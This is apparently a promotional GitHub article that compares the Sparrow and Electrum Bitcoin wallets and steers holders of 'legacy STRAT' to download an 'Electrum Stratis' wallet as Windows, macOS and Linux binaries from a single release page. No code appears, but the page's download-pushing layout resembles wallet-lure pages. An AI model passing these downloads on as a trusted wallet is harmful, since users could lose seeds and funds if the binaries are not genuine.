![Electrum-Stratis](assets/banner-article.png)

# Sparrow or Electrum: an honest comparison, with a Stratis note

<p align="center">Two Bitcoin wallets and one Stratis wallet</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

Sparrow and Electrum are both Bitcoin wallets, and neither can hold legacy STRAT. If your coins are on the legacy Stratis chain, the choice between them is not the choice in front of you; if your coins are Bitcoin, both are credible and differ in philosophy rather than quality. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain, and it exists because neither of those wallets serves this chain.

## You'll see this if

<div align="center">

| Need | Sparrow | Electrum | Electrum Stratis |
|---|---|---|---|
| Chain served | Bitcoin | Bitcoin | Legacy Stratis |
| Backup model | Seed | Seed | Seed |
| Coin control | Fine-grained | Basic to moderate | Standard |
| PSBT workflow | Core feature | Supported | Not the design centre |
| Hardware wallets | Broad support | Broad support | Limited |
| Cold staking | Not applicable | Not applicable | Supported |
| Address format | Bitcoin | Bitcoin | Legacy Stratis |

</div>

The table is the whole argument: two of these columns describe Bitcoin and one describes a different chain. Features do not cross the boundary.

## Why it happens

Sparrow grew out of a desire for transparency and control: a wallet that shows what a transaction is doing, supports PSBTs properly, and connects to your own node. Electrum grew out of a desire for speed and reliability on modest hardware, with a server model that made it usable when full nodes were expensive. Both are mature, and both are maintained by people who care about the details.

The difference that matters to most users is how much they want to see. Sparrow surfaces inputs, outputs, change and fee structure; Electrum hides more and asks fewer questions. Neither approach is wrong, and a user who has never needed coin control will not miss it.

What neither does is hold STRAT. Address prefixes, key prefixes and peer networks belong to a chain, so a Bitcoin wallet cannot parse a legacy Stratis address and a legacy wallet cannot spend a Bitcoin output. That is not a missing feature either project could add in a release; it is a different chain, and the table's last column is the one that applies to these coins. The comparison is useful for understanding design, not for choosing where to put these coins. A holder who reads the table and concludes that one wallet is better has answered a question about Bitcoin; the question in front of them is about a chain neither wallet serves, and a feature comparison cannot cross that line ([the Electrum Stratis product](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/what-this-wallet-is.md)). This wallet is actively maintained, with the current release on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19), and it exists for the chain neither comparison column covers.

## Fix

1. **Decide which chain you hold first.** If it is legacy STRAT, this is the wallet; the comparison is background reading. If it is Bitcoin, both peers are reasonable and the choice is about workflow.
2. **Pick Sparrow if you want visibility.** Coin control, PSBTs and node connection are its strengths, and they reward a user who wants them.
3. **Pick Electrum if you want simplicity and history.** It is fast, well understood, and has a decade of operational knowledge behind it.
4. **Do not try to bridge the two worlds.** A seed restored in a wallet for another chain produces addresses for that chain. It does not move coins.
5. **Judge each on its own chain.** A feature that is excellent on Bitcoin is irrelevant here, and cold staking is irrelevant there.

If you hold both Bitcoin and legacy STRAT, the honest answer is two wallets, clearly labelled, on separate profiles.

## If that did not work

If a comparison page tells you one wallet is "the best", it is answering a different question. Best depends on the chain, the workflow and the threat model.

If you restored a seed into the wrong wallet and see unfamiliar addresses, nothing is lost: the coins are on the chain they were sent on, and the correct wallet will show them.

If you need a feature neither peer offers here - cold staking, for instance - that is the reason this wallet exists, and no amount of configuration adds it to a Bitcoin wallet.

## Prevention

- Label wallets by chain, not by brand.
- Keep Bitcoin and Stratis installations separate.
- Choose a wallet for the chain you hold, then for the features.
- Verify addresses before every send, on both sides.
- Treat "best wallet" claims as marketing until the chain is named.

## FAQ

### Is Sparrow better than Electrum?

They optimise for different things: Sparrow for transparency and coin control, Electrum for speed and simplicity. On Bitcoin both are credible; on legacy Stratis neither applies, because neither serves the chain.

### Can Sparrow or Electrum hold my STRAT?

No. Both are Bitcoin wallets. Legacy STRAT requires a wallet built for that chain, with its address format and its peers.

### Why does this wallet not support Bitcoin?

It is a fork configured for one chain. Supporting a second chain would mean different parameters, different peers and a different product; the project keeps its boundary explicit instead of implying coverage it does not have.

### Which should I use for cold staking?

This wallet, because cold staking is a feature of the chain it serves. Neither Bitcoin wallet has anything to stake on this network.

<!-- DOWNLOAD-BLOCK -->

Sparrow is a Bitcoin wallet with policy tooling, coin control and hardware support that this project does not attempt. This wallet exists to open a legacy Stratis balance and move it. Comparing them feature by feature misses the point: one is a general Bitcoin workstation, the other is a narrow tool for a chain most software has forgotten, and neither can do the other's job.


Before you compare further, settle what a phrase does: [what the seed covers in Electrum Stratis](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/is-the-seed-enough-to-restore.md) and [Electrum Stratis versus Bitcoin](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/is-it-a-bitcoin-wallet.md) are the two facts that stop a feature table from misleading anyone.

## Related articles

- [Electrum alternatives, by category](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/alternatives-by-category.md)
- [What Electrum Stratis actually is](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/what-this-wallet-is.md)
- [STRAT is not STRAX](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/why-strat-and-strax-differ.md)
- [Is Electrum a Bitcoin wallet?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/is-it-a-bitcoin-wallet.md)
